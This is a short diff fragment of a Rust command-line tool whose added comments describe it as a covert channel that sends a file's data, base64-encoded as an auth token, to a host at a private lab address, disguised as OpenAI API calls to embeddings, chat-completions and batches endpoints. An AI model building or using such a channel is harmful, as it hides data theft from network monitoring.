@@ -10,10 +10,12 @@ struct Cli {
     filepath: String,
 }
 
+// Covert channel sending binary data encoded as b64 as Auth token
 #[tokio::main]
 async fn main() {
     let args = Cli::parse();
     let endpoint = "http://192.168.56.102:3000";
+    // Mimicking OpenAi's REST API
     let start_enpoint = format!("{}/embeddings", endpoint);
     let transmit_endpoint = format!("{}/chat/completions", endpoint);
     let end_endpoint = format!("{}/batches", endpoint);
